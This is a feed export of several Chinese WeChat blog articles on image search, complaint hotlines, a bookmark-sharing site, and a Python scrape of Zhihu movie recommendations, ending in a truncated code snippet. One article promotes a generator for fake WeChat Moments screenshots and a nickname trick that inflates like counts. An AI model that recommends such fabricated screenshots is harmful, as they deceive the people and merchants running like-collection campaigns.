辉夜大小姐想让我告白～天才们的恋爱头脑战。还提供YouTube视频源。 当然用谷歌也可以搜到。 搜图除了找影视剧之外还可以找无水印图（这样就不用自己找工具去水印了），比如这张含有微博水印的周星驰图片。 谷歌可以找到这篇文章https://k.sina.cn/article_1751106815_685fc4ff00100m9mx.html无水印图就这样找到了。 更多周星驰图片可以在微博话题#周星驰壁纸#找 。 如果是无水印微博图片如何找到微博博主呢？之前文章 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 已经分享过了。 通过Chrome扩展 微博图片反查 https://github.com/fei-ke/WeiboImageReverse 或者在线工具 https://gongpeione.github.io/wbimg2wb/，https://toolmao.com/tool/img2weibo/ ，直接输入微博图片地址获取博主微博。 最后分享个最近发现的找电影技巧，由于百度网盘屏蔽了搜索引擎， site:pan.baidu.com 大话西游 这样是搜不到结果的。剩下文章通过微信查看 如何通过电影截图找到电影 最近文章： Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 中秋/国庆节发福利了，小伙伴们来领现金红包 如何让你的搜索更高效 2020 最全电子书搜索网站，找电子书不再愁 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 如何根据台词找到对应电影片段 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何有效的维权，这些投诉平台你可能用得上]]></title>
    <url>%2F2020%2F10%2F16%2F%E5%A6%82%E4%BD%95%E6%9C%89%E6%95%88%E7%9A%84%E7%BB%B4%E6%9D%83%EF%BC%8C%E8%BF%99%E4%BA%9B%E6%8A%95%E8%AF%89%E5%B9%B3%E5%8F%B0%E4%BD%A0%E5%8F%AF%E8%83%BD%E7%94%A8%E5%BE%97%E4%B8%8A%2F</url>
    <content type="text"><![CDATA[苏生不惑第181篇原创文章，将本公众号设为星标，第一时间看最新文章。 生活中难免遇到个人权益受损，分享几个投诉平台进行维权，保护自己的个人权益。 12315每年的315晚会大家都看过， 12315是消费者投诉举报专线电话和全国互联网平台，2017年上线，可以投诉生活中遇到的各种消费陷阱 http://www.12315.cn/ ，除了网站还有APP，公众号，小程序。 12345市长热线很多城市都开通了12345市长热线，比如上海http://www.sh12345.gov.cn/ 国家网信办举报互联网违法网站和不良信息 https://www.12377.cn/ 工信部投诉垃圾短信、诈骗电话、骚扰电话、垃圾邮件、不良APP和网站、个人信息泄露等各类网络不良与垃圾信息https://www.12321.cn/ ，https://yhssglxt.miit.gov.cn/web/ 国家邮政局投诉快递问题 http://sswz.spb.gov.cn/ 黑猫投诉 新浪旗下消费者服务平台https://tousu.sina.com.cn/， 类似的还有聚投诉 http://ts.21cn.com/ ，电诉宝 http://show.s.315.100ec.cn/ 腾讯110举报在QQ/微信平台上的违法违规行为（比如钓鱼网站）https://110.qq.com/ 阿里安全中心类似腾讯的110，阿里也有110 https://110.alibaba.com/ 互联网信息服务终于有个网站可以治不良互联网企业了 https://ts.isc.org.cn/#/home 法律服务拖欠薪资，网购不给退货，被网暴人肉等都可以投诉 http://www.12348.gov.cn/sfbMobile/app/page/wap/home/wap_home.html更多法律法规可以查看网站http://search.chinalaw.gov.cn/search2.html 互联网法院之前某视频网站付费超前点播，有人就通过互联网法院进行投诉https://www.bjinternetcourt.gov.cn/index.html关于互联网法院在线诉讼流程可以看看这个豆瓣帖子 https://www.douban.com/group/topic/126517113/ 劳动纠纷调解全国劳动人事争议在线调解服务平台，如果遇到裁员不赔偿等可以这里投诉 http://223.71.147.149/portal/ 从上面网站可以看到大部分都是政府gov.cn网址，所以其他类似的举报投诉可以谷歌搜索来查找,比如 site:gov.cn 旅游举报 可以找到网站旅游服务平台 https://www.12301.cn/ 。 最后说个题外话，微博上看到的，现在手机绑定了太多东西，如果手机不小心丢了记得做以下4件事： 1.手机运营商挂失号码，防止他人用验证码登录你的账号，为了以防万一可以设置个SIM卡密码。2.致电银行客服，挂失手机银行网银账号。3.拨打95188挂失支付宝账号。4.https://weixin110.qq.com/ 冻结微信。 最近文章： Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 中秋/国庆节发福利了，小伙伴们来领现金红包 如何让你的搜索更高效 2020 最全电子书搜索网站，找电子书不再愁 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 如何根据台词找到对应电影片段 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[宝藏网站系列：浏览器书签共享平台]]></title>
    <url>%2F2020%2F10%2F16%2F%E5%AE%9D%E8%97%8F%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%A6%E7%AD%BE%E5%85%B1%E4%BA%AB%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[苏生不惑第180篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过宝藏网站 这个网站堪称宝藏，收藏起来吧 ，宝藏网站系列：这个网站号称万能 ，今天分享的是宝藏网站系列之浏览器书签共享平台 https://www.bookmarkearth.com/ ,这是个可以分享且查看下载他人浏览器收藏书签的网站，大家可以一起分享有趣实用的网站。 比如这位网友2天前分享的书签有2925个网址 ，文件大小1.8M ，包含分类工具，配色，字体素材，站长工具等。目前有117页，书签比较多。 右侧提供了点赞排行，下载排行和评论排行，可以看看这里分享的书签。还可以自己搜索找书签，也许有意外发现。 点击书签下的下载按钮可以下载他的书签。 之后跳转到下载页面https://www.bookmarkearth.com/detail/f792924da50440a884e2cd8339a4dcc8勾选要下载的书签下载到本地，是个HTML文件。然后将下载的书签导入到自己的浏览器，网站还提供教程https://www.bookmarkearth.com/tutorial ，支持各种浏览器。 我用的谷歌浏览器（关于谷歌浏览器使用技巧见之前文章那些你可能不知道的谷歌浏览器实用技巧），打开书签地址 chrome://bookmarks/点击导入刚才下载的HTML文件就好了。书签里的网址可以直接查看了。网站还提供了Chrome插件书签地球助手 https://www.bookmarkearth.com/plugin/index ，主要功能有: [1]、提供书签快速访问途径、书签失效重复检测、书签置顶、书签自定义排序等；[2]、书签自定义导入导出，想要备份部分书签“书签地球助手”一键轻松搞定；[3]、提供新标签页替代方案，书签访问、历史记录、默认搜索、背景图片轻松定制美化；[4]、插件界面可共完全的DIY设置，个性的「书签管理工具」从“书签地球助手”开始； 安装Chrome扩展可以参考之前文章 上不了谷歌如何安装 Chrome 扩展？ ，管理扩展可以使用二管家 谷歌浏览器安装的 Chrome 扩展越来越多，怎么管理？ 在浏览器可视区域添加快捷书签操作 。点击Chrome扩展可以对书签地球助手自定义设置。 除了下载别人的书签，大家也可以自己上传书签分享给更多网友 https://www.bookmarkearth.com/upload/ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法和九宫格图片 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 抖音 一键下载无水印抖音视频 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集赞生成器：朋友圈集赞不求人]]></title>
    <url>%2F2020%2F10%2F16%2F%E9%9B%86%E8%B5%9E%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%9A%E6%9C%8B%E5%8F%8B%E5%9C%88%E9%9B%86%E8%B5%9E%E4%B8%8D%E6%B1%82%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[苏生不惑第185 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过很多文章了，有兴趣可以点击查看： 如何导出你的微信语音 c 盘空间又满了？微信清理神器帮你释放空间 微信撤回的消息也能看到！ 如何备份可能被删的公众号文章和网页 如何在电脑上登陆多个微信 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 一键生成你的微信社交数据报告 如何发一条九宫格图片的朋友圈 朋友圈会经常看见有人集赞，应该说求赞，可能过个十分钟都没几个赞，群发私信求赞打扰人还可能就被人删了，这里分享个集赞生成器，让你在朋友圈集赞不求人。 朋友圈转发截图生成器这是个在线工具（公众号后台回复 朋友圈 获取） ，用于生成朋友圈的集赞截图。 可以修改设置你的微信昵称，内容，截图类型（纯文字，分享网页，单张图片，九宫格图片），地理定位，发表日期，截图日期，点赞数，图片长度，显示评论区，这里做个简单的纯文字版朋友圈截图，生成后的效果。保存图片的效果，头像还挺逼真的。 再来个转发文章版本。 还有图片形式。 添加评论样式。 修改微信昵称点赞上面是朋友圈页面的截图，如果要朋友圈列表的截图可以通过修改微信昵称来实现，就是修改微信昵称为多个昵称逗号分隔的长串，像这样的。然后点赞朋友圈，效果是这样的，一个号点赞相当于7个号点赞了，看起来赞数成倍增加。 微信表情加小辫子最近在朋友圈看到很多发这种表情的，就是微信表情前后多了个小辫子（公众号后台回复 表情获取这2个小辫子字符），然后把微信表情放中间即可，其实没什么用，就是好玩。 说个题外话，最新版pc客户端（3.0.0.47） 可以在通讯录中批量管理联系人了https://pc.weixin.qq.com/ ，再也不用在手机上修改备注，标签，删除好友什么的了。朋友权限可以设置为仅聊天或者不看对方朋友圈，和APP上一样。n久不活跃的微信群也可以找到了。另外安卓内测版7.0.20增加了开启青少年模式，可以在会话的表情面板搜索表情，新增聊天“不显示”选项（微信主界面不显示，但不删除聊天记录），还支持安卓平板和手机同时在线，有兴趣的可以点击文末阅读原文参与内测使用。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了]]></title>
    <url>%2F2020%2F10%2F16%2FPython%E6%8A%93%E5%8F%96%E7%9F%A5%E4%B9%8E%E7%94%B5%E5%BD%B1%E8%AF%9D%E9%A2%98%E4%B8%8B%E4%B8%87%E5%8D%83%E7%BD%91%E5%8F%8B%E6%8E%A8%E8%8D%90%E7%9A%84%E7%94%B5%E5%BD%B1%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9B%BD%E5%BA%86%E8%8A%82%E4%B8%8D%E6%84%81%E6%B2%A1%E7%94%B5%E5%BD%B1%E7%9C%8B%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第179 篇原创文章，将本公众号设为星标，第一时间看最新文章。 国庆假期第3天，你在家宅还是在外出游玩呢，如果在家无聊推荐几部经典电影给你看看。 这里用 Python 抓取知乎上的电影话题https://www.zhihu.com/topic/19550429/top-answers和影视话题https://www.zhihu.com/topic/19554706/top-answers 下回答人数多的几个问题，并提取回答中提及电影次数前50的电影。 问题： 如果给你30秒让你说出三部你觉得最好的电影，会是哪三部 https://www.zhihu.com/question/369042910，13202个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 霸王别姬, 阿甘正传, 怦然心动, 海上钢琴师, 泰坦尼克号, 星际穿越, 美丽人生, 当幸福来敲门, 教父, 绿皮书, 千与千寻, 让子弹飞, 这个杀手不太冷, 楚门的世界, 活着, 三傻大闹宝莱坞, 我不是药神, 盗梦空间, 少年的你, 辛德勒的名单, 放牛班的春天, 寄生虫, 大话西游, 傲慢与偏见,哈利波特, 忠犬八公的故事, 流浪地球, 乱世佳人, 末代皇帝, 触不可及, 你的名字，何以为家, 功夫, 看不见的客人, 黑客帝国, 寻梦环游记, 爱乐之城, 心灵捕手, 情书, 死亡诗社, 釜山行, 指环王, 无间道, 美国往事, 闻香识女人, 请以你的名字呼唤我, 低俗小说, 大鱼。 Python生成的饼图 问题：有哪些你看过五遍以上的电影？https://www.zhihu.com/question/31537241 ，22664个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 霸王别姬, 阿甘正传, 千与千寻, 大话西游, 怦然心动, 教父, 泰坦尼克号, 让子弹飞, 海上钢琴师, 这个杀手不太冷, 三傻大闹宝莱坞, 功夫, 星际穿越, 盗梦空间, 初恋这件小事, 当幸福来敲门, 傲慢与偏见, 无间道, 情书, 龙猫, 哈尔的移动城堡, 哈利波特, 美国往事, 楚门的世界, 不能说的秘密, 唐伯虎点秋香, 喜剧之王, 东邪西毒, 美丽人生, 活着, 东成西就, 触不可及, 夏洛特烦恼,小森林, 黑客帝国, 闻香识女人, 一一, 真爱至上, 乱世佳人, 重庆森林, 你的名字, 放牛班的春天,低俗小说, 罗马假日, 搏击俱乐部, 天使爱美丽, 西西里的美丽传说, 辛德勒的名单, 天堂电影院。 Python生成的饼图问题：有哪些电影一定要趁年轻看？https://www.zhihu.com/question/25699277，5355个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 阿甘正传, 当幸福来敲门, 怦然心动, 三傻大闹宝莱坞, 死亡诗社, 霸王别姬, 教父, 心灵捕手, 楚门的世界, 海上钢琴师, 放牛班的春天, 泰坦尼克号, 阳光灿烂的日子, 情书, 风雨哈佛路,美丽人生, 千与千寻, 熔炉, 垫底辣妹, 这个杀手不太冷, 美丽心灵, 搏击俱乐部, 爆裂鼓手, 西西里的美丽传说, 闻香识女人, 初恋这件小事, 美国往事, 白日梦想家, 大鱼, 星际穿越, 活着, 阳光姐妹淘,傲慢与偏见, 天堂电影院, 猜火车, 辛德勒的名单, 喜剧之王, 一一, 盗梦空间, 穿普拉达的女王, 被嫌弃的松子的一生, 大话西游, 触不可及, 罗马假日, 忠犬八公的故事, 假如爱有天意, 饮食男女, 天使爱美丽, 牯岭街少年杀人事件。 Python生成的饼图问题：有哪些好看到让人无法自拔、久久不忘的电影？https://www.zhihu.com/question/38485891，12240个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 熔炉, 霸王别姬, 海上钢琴师, 阿甘正传, 教父, 这个杀手不太冷, 辩护人, 素媛, 星际穿越, 告白, 泰坦尼克号, 怦然心动, 搏击俱乐部, 楚门的世界, 美国往事, 美丽人生, 杀人回忆,狩猎, 活着, 情书, 西西里的美丽传说, 爆裂鼓手, 被嫌弃的松子的一生, 盗梦空间, 恐怖直播, 当幸福来敲门, 辛德勒的名单, 超脱, 无间道, 死亡诗社, 大话西游, 梦之安魂曲, 勇敢的心, 香水, 控方证人, 消失的爱人, 闻香识女人, 穿条纹睡衣的男孩, 低俗小说, 三傻大闹宝莱坞, 触不可及, 忠犬八公的故事, 天堂电影院, 万能钥匙, 禁闭岛, 断背山, 十二公民, 美丽心灵, 恐怖游轮。问题：如果让你向别人推荐十部电影，你会推荐哪十部？https://www.zhihu.com/question/281185483 ，5820个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 霸王别姬, 阿甘正传, 泰坦尼克号, 当幸福来敲门, 教父, 怦然心动, 海上钢琴师, 这个杀手不太冷, 美丽人生, 千与千寻, 活着, 楚门的世界, 星际穿越, 辛德勒的名单, 盗梦空间, 三傻大闹宝莱坞, 放牛班的春天, 我不是药神, 熔炉, 无间道, 低俗小说, 大话西游, 让子弹飞, 西西里的美丽传说, 闻香识女人, 忠犬八公的故事, 美国往事, 死亡诗社, 情书, 心灵捕手, 寻梦环游记, 末代皇帝,看不见的客人, 罗马假日, 天堂电影院, 绿皮书, 重庆森林, 乱世佳人, 被嫌弃的松子的一生, 少年派的奇幻漂流, 阳光灿烂的日子, 触不可及, 拯救大兵瑞恩, 何以为家, 小森林, 断背山, 十二怒汉, 釜山行, 素媛。 Python生成的饼图问题：有什么高分好看的电影推荐？https://www.zhihu.com/question/342727398，1467个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 霸王别姬, 美丽人生, 阿甘正传, 寄生虫, 绿皮书, 泰坦尼克号, 海上钢琴师, 楚门的世界, 当幸福来敲门, 何以为家, 怦然心动, 这个杀手不太冷, 盗梦空间, 千与千寻, 辛德勒的名单, 少年的你, 小丑, 教父, 星际穿越, 我不是药神, 放牛班的春天, 婚姻故事, 误杀, 三傻大闹宝莱坞, 忠犬八公的故事, 爱尔兰人, 触不可及, 哪吒之魔童降世, 美国往事, 闻香识女人, 天堂电影院, 熔炉, 辩护人, 流浪地球, 罗马假日, 乱世佳人, 情书, 看不见的客人, 调音师, 小鞋子, 罗小黑战记, 活着, 穿条纹睡衣的男孩, 控方证人, 搏击俱乐部, 海蒂和爷爷, 西西里的美丽传说, 饮食男女, 了不起的盖茨比。 Python生成的饼图问题：如果只能推荐两部电影你会推荐哪两部https://www.zhihu.com/question/368550554，1321个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 阿甘正传, 霸王别姬, 海上钢琴师, 泰坦尼克号, 当幸福来敲门, 这个杀手不太冷, 星际穿越, 寄生虫, 美丽人生, 怦然心动, 大鱼, 活着, 小丑, 辛德勒的名单, 千与千寻, 乱世佳人, 楚门的世界, 教父, 爱乐之城, 末代皇帝, 活埋, 美国往事, 何以为家, 白日梦想家, 让子弹飞, 小森林,调音师, 我不是药神, 傲慢与偏见, 一一, 天使爱美丽, 放牛班的春天, 盗梦空间, 布达佩斯大饭店, 情书, 了不起的盖茨比, 请以你的名字呼唤我, 大话西游, 绿皮书, 忠犬八公的故事, 饮食男女, 寻梦环游记, 出租车司机, 看不见的客人, 守望者, 春光乍泄, 菊次郎的夏天, 小鞋子, 触不可及。 Python生成的饼图问题：有哪些爆笑恶搞能把人笑爆炸的电影值得推荐 https://www.zhihu.com/question/36918815，1685个回答中提及电影次数最高前50的电影为： 惊声尖笑, 独裁者, 你丫闭嘴, 东成西就, 宿醉, 白头神探, 电影43, 僵尸肖恩, 三傻大闹宝莱坞, 波拉特, 小姐好白, 蜻蜓侠, 上帝也疯狂, 这不是斯巴达, 两杆大烟枪, 洋葱电影, 夏洛特烦恼, 买凶拍人, 虎口脱险, 美国派, 超级英雄, 冒牌家庭, 空前绝后满天飞, 葬礼上的死亡, 王牌贱谍, 冒牌天神,女间谍, 反斗神鹰, 热情似火, IT狂人, 预产期, 龙虎少年队, 暮光之城, 巨蟒与圣杯, 神探飞机头,唐伯虎点秋香, 笑破铁幕, 变相怪杰, 热血警探, 低俗小说, 我为玛丽狂, 挨饿游戏, 世界尽头, 暮色大电影, 斯巴达300勇士, 疯狂的赛车, 变态假面, 世界末日, 微不足道, 九品芝麻官。 Python生成的饼图问题：有哪些优秀的、「燃到爆」的电影？ https://www.zhihu.com/question/48035752，1505个回答中提及电影次数最高前50的电影为： 爆裂鼓手, 速度与激情, 英雄本色, 王牌特工, 突袭, 勇士, 热血高校, 铁甲钢拳, 谍影重重, 搏击俱乐部, 暴力街区, 激战, 飓风营救, 肖申克的救赎, 垫底辣妹, 热血警探, 怒火攻心, 白日梦想家, 飞鹰艾迪, 十三刺客, 杀破狼, 安娜, 疾速追杀, 叶问, 海盗电台, 硬核亨利, 夏日大作战, 疾速特攻,杀死比尔, 极盗者, 恐怖直播, V字仇杀队, 功之怒, 碟中谍, 惊天魔盗团, 勇敢的心, 战狼2, 环太平洋, 洛奇, 当幸福来敲门, 大叔, 赛德克巴莱, 极速风流, 湄公河行动, 终极斗士, 复联4, 这个杀手不太冷, 孤胆特工, 勇闯夺命岛, 疯狂的麦克斯：狂暴之路。 Python生成的饼图 问题：你心目中的香港电影十佳是哪些？https://www.zhihu.com/question/19809033，550个回答中提及电影次数最高前50的电影为： 无间道, 英雄本色, 大话西游, 东邪西毒, 甜蜜蜜, 倩女幽魂, 春光乍泄, 阿飞正传, 枪火, 纵横四海, 花样年华, 喜剧之王, 东成西就, 新龙门客栈, 重庆森林, 黑社会, 青蛇, 暗战, 功夫, 胭脂扣, 古惑仔, 赌神, 秋天的童话, 桃姐, 暗花, 阿郎的故事, 霸王别姬, 神探, 志明与春娇, 喋血双雄, 警察故事, 岁月神偷, 笑傲江湖, 精武英雄, 唐伯虎点秋香, A计划, 监狱风云, 家有喜事, 东方不败, 无间道2, 黄飞鸿, 买凶拍人, 天水围的日与夜, 精武门, 僵尸先生, 女人四十, 黑金, 跛豪, 喋血街头,跟踪。 Python生成的饼图 问题：有哪些好看的韩国电影值得推荐 https://www.zhihu.com/question/35685110，843个回答中提及电影次数最高前50的电影为： 熔炉, 辩护人, 素媛, 杀人回忆, 恐怖直播, 釜山行, 七号房的礼物, 假如爱有天意, 新世界, 黄海,追击者, 老男孩, 阳光姐妹淘, 与神同行, 我的野蛮女友, 流感, 暗杀, 汉江怪物, 隐秘而伟大, 狼少年, 奇怪的她, 建筑学概论, 我爱你, 铁线虫入侵, 卑劣的街头, 小姐, 寄生虫, 出租车司机, 隧道,雏菊, 老手, 亲切的金子, 太极旗飘扬, 金福南杀人事件始末, 开心家族, 雪国列车, 欢迎来到东莫村,人间中毒, 孤胆特工, 空房间, 国际市场, 看见恶魔, 特工, 思悼, 内在美, 大叔, 霜花店, 八月照相馆, 共同警备区, 回家的路。 Python生成的饼图 问题：你认为哪些华语电影是被严重低估的 https://www.zhihu.com/question/20826845，972个回答中提及电影次数最高前50的电影为： 英雄, 无极, 大明劫, 不能说的秘密, 万箭穿心, 落叶归根, 剑雨, 投名状, 道士下山, 黄土地, 中邪, 半生缘, 十月围城, 魁拔, 唐探, 闪光少女, 心花路放, 绣春刀, 独自等待, 情圣, 无人区, 唐探2, 天狗, 一一, 妖猫传, 杀生, 王的盛宴, 霸王别姬, 心迷宫, 满城尽带黄金甲, 无间道, 天注定,斗牛, 阿飞正传, 建党伟业, 蜀山传, 三峡好人, 双瞳, 夜宴, 功夫, 牯岭街, 紫日, 喜剧之王, 狗十三, 一代宗师, 诡丝, 我们俩, 有话好好说, 钢的琴, 烈日灼心。 Python生成的饼图 问题：有哪些搞笑又发人深省的电影https://www.zhihu.com/question/49560603，436个回答中提及电影次数最高前50的电影为： 驴得水, 三傻大闹宝莱坞, 大话西游, 三傻, 喜剧之王, 唐人街探案, 唐伯虎点秋香, 杀生, 人生遥控器, 夏洛特烦恼, PK, 逃狱三王, 美人鱼, 触不可及, 阿甘正传, 盗钥匙的方法, 被嫌弃的松子的一生,我的个神啊, 城市之光, 奇怪的她, 一个叫欧维的男人决定去死, 我是好人, 大话王, 我的野蛮女友, 落叶归根, 让子弹飞, 美丽人生, 阳光姐妹淘, 一念天堂, 一个勺子, 重返二十岁, 甲方乙方, 你逃我也逃, 芳华, 疯狂动物城, 白日梦想家, 功夫, 鬼子来了, Keep on the sunny side, 九品芝麻官, 青春派, 垫底辣妹, 那些年, 三个傻瓜, 飞跃疯人院, 初恋这件小事, 交响人生, 奶奶强盗团, 三毛从军记, 两杆大烟枪。 Python生成的饼图 问题：有哪些好看的高智商悬疑电影 https://www.zhihu.com/question/35811067，2044个回答中提及电影次数最高前50的电影为： 禁闭岛, 看不见的客人, 恐怖游轮, 盗梦空间, 穆赫兰道, 致命ID, 万能钥匙, 记忆碎片, 彗星来的那一夜, 致命魔术, 蝴蝶效应, 消失的爱人, 七宗罪, 沉默的羔羊, 搏击俱乐部, 控方证人, 非常嫌疑犯,前目的地, 心迷宫, 神探, 电锯惊魂, 第六感, 源代码, 调音师, 一级恐惧, 小岛惊魂, 黑暗面, 越狱, 神探夏洛克, 时空罪恶, 未麻的部屋, 杀人回忆, 生死停留, 告白, 机械师, 惊天魔盗团, 猫鼠游戏, 误杀瞒天记, 孤儿怨, 迷雾, 海市蜃楼, 汉尼拔, 死亡幻觉, 守法公民, 无人生还, 追随, 催眠大师, 红辣椒, 无双, 香水。 Python生成的饼图 问题：有没有一部可以让人痛哭流涕的电影https://www.zhihu.com/question/343259251，2466个回答中提及电影次数最高前50的电影为： 忠犬八公的故事, 七号房的礼物, 忠犬八公, 素媛, 何以为家, 熔炉, 我不是药神, 妈妈再爱我一次, 被嫌弃的松子的一生, 婚纱, 少年的你, 美丽人生, 泰坦尼克号, 我爱你, 萤火虫之墓, 海上钢琴师, 岁月神偷, 唐山大地震, 我是山姆, 霸王别姬, 我和我的祖国, 一条狗的使命, 寻梦环游记, 假如爱有天意,大话西游, 完美的世界, 开心家族, 比悲伤更悲伤的故事, 我脑海中的橡皮擦, 亲爱的, 天堂电影院, 遇见你之前, 狼少年, 情书, 当幸福来敲门, 暖春, 穿条纹睡衣的男孩, 无问西东, 活着, 悲伤逆流成河, 人狗奇缘, 人工智能, 死亡诗社, 全民目击, 金陵十三钗, 这个杀手不太冷, 小偷家族, 阿甘正传, 烈火英雄, 肖申克的救赎。 Python生成的饼图 问题：让你感动到哭的电影是什么 https://www.zhihu.com/question/24946395，1453个回答中提及电影次数最高前50的电影为： 忠犬八公, 素媛, 七号房的礼物, 忠犬八公的故事, 当幸福来敲门, 美丽人生, 死亡诗社, 婚纱, 泰坦尼克号, 妈妈再爱我一次, 被嫌弃的松子的一生, 狼少年, 熔炉, 霸王别姬, 肖申克的救赎, 唐山大地震,阿甘正传, 釜山行, 天堂电影院, 假如爱有天意, 黑太阳731, 海上钢琴师, 入殓师, 这个杀手不太冷,亲爱的, 海洋天堂, 飞屋环游记, 我爱你, 岁月神偷, 萤火虫之墓, 初恋这件小事, 大话西游, 人工智能, 情书, 窃听风暴, 三傻大闹宝莱坞, 活着, 美丽心灵, 归来, 小萝莉的猴神大叔, 寻梦环游记, 完美的世界, 开心鬼上身, 外婆的家, 暖春, 勇敢的心, 小鞋子, 雏菊, 血战钢锯岭, 辛德勒的名单。 Python生成的饼图 问题：有没有一部电影让你在深夜中痛哭 https://www.zhihu.com/question/37206525，19105个回答中提及电影次数最高前50的电影为： 忠犬八公, 七号房的礼物, 素媛, 被嫌弃的松子的一生, 熔炉, 婚纱, 忠犬八公的故事, 霸王别姬, 海上钢琴师, 岁月神偷, 萤火虫之墓, 大话西游, 初恋这件小事, 这个杀手不太冷, 泰坦尼克号, 假如爱有天意, 当幸福来敲门, 狼少年, 我爱你, 美丽人生, 我的少女时代, 入殓师, 情书, 断背山, 肖申克的救赎, 死亡诗社, 狩猎, 开心家族, 恋恋笔记本, 亲爱的, 天堂电影院, 垫底辣妹, 喜剧之王, 穿条纹睡衣的男孩, 阿甘正传, 比悲伤更悲伤的故事, 妈妈再爱我一次, 唐山大地震, 阳光姐妹淘, 辩护人, 辛德勒的名单, one day, 暖春, 完美的世界, 秒速五厘米, 人工智能, 星际穿越, 活着, 蓝宇, 雏菊。 Python生成的饼图 问题：有哪些看完可以让人热血沸腾的动作片推荐？ https://www.zhihu.com/question/27855422，503个回答中提及电影次数最高前50的电影为： 谍影重重, 杀破狼, 疾速追杀, 热血高校, 突袭, 狼牙, 第一滴血, 洛奇, 敢死队, 速度与激情, 导火线, 叶问, 激战, 勇士, John Wick, 虎胆龙威, 空中监狱, 机械师, 疾速备战, 这个杀手不太冷, 精武英雄, 疾速特攻, 非常人贩, 战狼, 力王, 伸冤人, 特工绍特, 勇闯夺命岛, 功夫, 杀死比尔, 刺客联盟, 暴力街区, 飓风营救, 拳霸, 绣春刀, 飓风营救1, 终极斗士, 怒火攻心, 变脸, 怒火救援, 藏身之所, 功夫宗师霍元甲, 霍元甲, 碟中谍, 斯巴达克斯, 反击, 疯狂的麦克斯4：狂暴之路, 黑客帝国, 卑劣的街头, 极限特工。 Python生成的饼图 问题：有没有什么演员演技炸裂的电视剧或电影？ https://www.zhihu.com/question/337052769，343个回答中提及电影次数最高前50的电影为： 霸王别姬, 我的团长我的团, 白夜追凶, 鸡毛飞上天, 黑社会, 琅琊榜, 如懿传, 战长沙, 香蜜沉沉烬如霜, 长安十二时辰, 陈情令, 镇魂, 蓝色茉莉, 都挺好, 加油你是最棒的, 当幸福来敲门, 士兵突击,何以为家, 英雄本色, 伪装者, 烈日灼心, 枪王, 春光乍泄, 孤儿怨, 杀人回忆, 归来, 天道, 我的前半生, 釜山行, 父母爱情, 大明王朝1566, 绿皮书, 柒个我, 致命女人, 武林外传, 万箭穿心, 沙海,甄嬛传, 一把青, 我们与恶的距离, 老酒馆, 东宫, 杀死伊芙, 小委托人, 熔炉, 芈月传, 请回答1988, 人民的名义, 轮到你了, 信号。 Python生成的饼图 问题：有哪部电影让你受益良多？ https://www.zhihu.com/question/303835412，2374个回答中提及电影次数最高前50的电影为： 肖申克的救赎, 阿甘正传, 当幸福来敲门, 教父, 三傻大闹宝莱坞, 怦然心动, 海上钢琴师, 霸王别姬,美丽人生, 死亡诗社, 一一, 大鱼, 楚门的世界, 我不是药神, 垫底辣妹, 千与千寻, 无问西东, 活着, 乱世佳人, 被嫌弃的松子的一生, 搏击俱乐部, 泰坦尼克号, 白日梦想家, 心灵捕手, 辛德勒的名单,步履不停, 邪不压正, 狗十三, 返老还童, 美国往事, 闻香识女人, 了不起的盖茨比, 忠犬八公的故事,这个杀手不太冷, 触不可及, 放牛班的春天, 海街日记, 星际穿越, 天堂电影院, 熔炉, 寻梦环游记, 时空恋旅人, 悲伤逆流成河, 大话西游, 超脱, 东邪西毒, 小偷家族, 何以为家, 本杰明·巴顿奇事, 西西里的美丽传说。 Python生成的饼图最后将上面所有问题提及的电影生成的文件合并统计。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839import osimport pandas as pdimport numpy as npimport globfrom pyecharts import options as optsfrom pyecharts.charts import Barfrom pyecharts.charts import Piefrom wordcloud import WordCloudimport matplotlib.pyplot as pltframes = []for root, dirs, files in os.walk('.'): for file in files: if file.endswith('.csv'): print(os.path.join(root,file)) df = pd.read_csv(os.path.join(root,file)) frames.append(df)#合并所有数据result = pd.concat(frames)result=result.replace('忠犬八公的故事','忠犬八公')#df.replace(&#123;'B':'E','C':'F'&#125;)df=result.groupby('name').agg('sum')df.sort_values(by=['counts'], ascending=False, inplace=True)print(df.head(50))names = df['name'].head(50).tolist()counts = df['counts'].head(50).tolist()df.head(50).to_csv('res.csv',encoding="utf_8_sig")bar = ( Bar() .add_xaxis(names) .add_yaxis("", counts))bar.render('bar.html')pie = ( 